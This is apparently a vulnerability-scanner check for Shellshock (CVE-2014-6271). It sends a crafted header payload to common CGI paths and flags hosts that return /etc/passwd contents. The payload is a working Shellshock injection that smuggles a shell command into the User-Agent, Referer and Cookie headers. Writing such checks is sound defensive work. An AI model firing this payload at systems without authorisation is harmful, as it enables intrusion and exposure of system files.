metadata:
    language: v2-beta
    name: "CVE-2014-6271 Shellshock"
    description: "Tests for the Shellshock vulnerability"
    author: "lUcgryy"
    tags: "Shellshock", "CVE-2014-6271", "cve"

define:
    payload = "() { :;}; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
    issueDetail = `CVE-2014-6271 Shellshock vulnerability detected`
    issueRemediation = "Make sure you are up to date with patches and follow the remediation steps for CVE-2014-6271."
run for each:
    potential_path =
        "",
        "/cgi-bin/status",
        "/cgi-bin/stats",
        "/cgi-bin/test",
        "/cgi-bin/status/status.cgi",
        "/test.cgi",
        "/debug.cgi",
        "/cgi-bin/test-cgi",
        "/cgi-bin/test.cgi"
given host then
    send request:
        method: "GET"
        path: {potential_path}
        replacing headers:
            "User-Agent": `{payload}`,
            "Referer": `{payload}`,
            "Cookie": `{payload}`
    if {latest.response} matches "root:.*:0:0:" then
        report issue:
            severity: high
            confidence: firm
            detail: `{issueDetail}`
            remediation: `{issueRemediation}`
    end if
